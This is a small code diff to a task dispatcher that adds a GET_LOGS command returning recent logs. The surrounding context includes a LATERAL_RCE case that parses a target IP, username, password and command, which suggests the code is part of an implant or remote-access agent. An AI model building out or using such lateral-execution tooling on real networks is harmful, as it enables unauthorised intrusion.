@@ -117,6 +117,10 @@ void TaskDispatcher::dispatch(const Task& task) {
                 }
                 break;
             }
+            case TaskType::GET_LOGS: {
+                result.output = "LOGS:\n" + utils::Logger::GetRecentLogs();
+                break;
+            }
             case TaskType::LATERAL_RCE: {
                 // Parse cmd: target_ip|user|pass|command
                 std::string target, user, pass, rcmd;
